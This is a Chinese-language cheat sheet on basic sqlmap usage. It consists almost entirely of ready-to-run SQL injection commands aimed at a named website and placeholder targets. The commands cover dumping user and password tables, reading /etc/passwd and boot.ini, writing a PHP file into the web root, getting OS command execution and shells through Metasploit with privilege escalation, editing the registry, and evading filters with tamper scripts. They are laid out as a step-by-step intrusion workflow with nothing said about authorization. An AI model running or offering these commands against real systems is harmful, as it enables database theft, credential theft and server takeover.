
.. _security.nmap.base:

======================================================================================================================================================
sqlmap基本使用
======================================================================================================================================================

:Date: 2019-3

.. contents::


sqlmap简单实用
======================================================================================================================================================





- 在网页后面添加 ``'`` 测试
- 在网页后面添加 ``and 1=2`` 测试

查询链接的服务器使用的什么数据库：
    - sqlmap -u http://xxxxxx.com/xxx.asp?ID=xxxx --dbs --current-user
    - 会测试出服务器系统/web服务器类型/数据库类型

查询数据库中的表名称：
    - sqlmap -u http://xxxxxx.com/xxx.asp?ID=xxxx --tables
    - 这一步可能会根据sqlmap的字典来猜测数据库中表的名称

查询数据库中指定表(这里表明uname)的列名称：
    - sqlmap -u http://xxxxxx.com/xxx.asp?ID=xxxx -T uname --columns

查询数据库中指定表(这里表明uname)的指定列（username,password,login_name）的数据：
    - sqlmap -u http://xxxxxx.com/xxx.asp?ID=xxxx -T uname -C username,password,login_name --dump




常用语句
1.
./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -f -b –current-user –current-db –users –passwords –dbs -v 0
2.
./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -b –passwords -U root –union-use -v 2
3.
./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -b –dump -T users -C username -D userdb –start 2 –stop 3 -v 2
4.
./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -b –dump -C “user,pass” -v 1 –exclude-sysdbs
5.
./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -b –sql-shell -v 2
6.
./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -b –file-read “c:\boot.ini” -v 2
7.
./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -b –file-write /test/test.txt –file-dest /var/www/html/1.txt -v 2
8.
./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -b –os-cmd “id” -v 1
9.
./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -b –os-shell –union-use -v 2
10.
./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -b –os-pwn –msf-path=/opt/framework/msf3 –priv-esc -v 1
11.
./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -b –os-pwn –msf-path=/opt/framework/msf3 -v 1
12.
./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -b –os-bof –msf-path=/opt/framework/msf3 -v 1
13.
./sqlmap.py -u http://www.91ri.org/ test.php?p=2 –reg-add –reg-key=”HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap” –reg-value=Test –reg-type=REG_SZ –reg-data=1
14.
./sqlmap.py -u http://www.91ri.org/ test.php?p=2 -b –eta
15.
./sqlmap.py -u “http://www.91ri.org/ sqlmap/mysql/get_str_brackets.php?id=1″ -p id –prefix “‘)” –suffix “AND (‘abc’='abc”
16.
./sqlmap.py -u “http://www.91ri.org/ sqlmap/mysql/basic/get_int.php?id=1″ –auth-type Basic –auth-cred “testuser:testpass”
17.
./sqlmap.py -l burp.log –scope=”(www)?\.target\.(com|net|org)”
18.
./sqlmap.py -u “http://www.91ri.org/ sqlmap/mysql/get_int.php?id=1″ –tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3
19.
./sqlmap.py -u “http://www.91ri.org/ sqlmap/mssql/get_int.php?id=1″ –sql-query “SELECT ‘foo’” -v 1
20.
./sqlmap.py -u “http://www.91ri.org/ mysql/get_int_4.php?id=1″ –common-tables -D testdb –banner

简单的注入流程

1.读取数据库版本，当前用户，当前数据库

sqlmap -u http://www.91ri.org/ test.php?p=2 -f -b –current-user –current-db -v 1

2.判断当前数据库用户权限

sqlmap -u http://www.91ri.org/ test.php?p=2 –privileges -U 用户名 -v 1
sqlmap -u http://www.91ri.org/ test.php?p=2 –is-dba -U 用户名 -v 1

3.读取所有数据库用户或指定数据库用户的密码

sqlmap -u http://www.91ri.org/ test.php?p=2 –users –passwords -v 2
sqlmap -u http://www.91ri.org/ test.php?p=2 –passwords -U root -v 2

4.获取所有数据库

sqlmap -u http://www.91ri.org/ test.php?p=2 –dbs -v 2

5.获取指定数据库中的所有表

sqlmap -u http://www.91ri.org/ test.php?p=2 –tables -D mysql -v 2

6.获取指定数据库名中指定表的字段

sqlmap -u http://www.91ri.org/ test.php?p=2 –columns -D mysql -T users -v 2

7.获取指定数据库名中指定表中指定字段的数据

sqlmap -u http://www.91ri.org/ test.php?p=2 –dump -D mysql -T users -C “username,password” -s “sqlnmapdb.log” -v 2

8.file-read读取web文件

sqlmap -u http://www.91ri.org/ test.php?p=2 –file-read “/etc/passwd” -v 2

9.file-write写入文件到web

sqlmap -u http://www.91ri.org/ test.php?p=2 –file-write /localhost/mm.php –file-dest /var/www/html/xx.php -v 2


















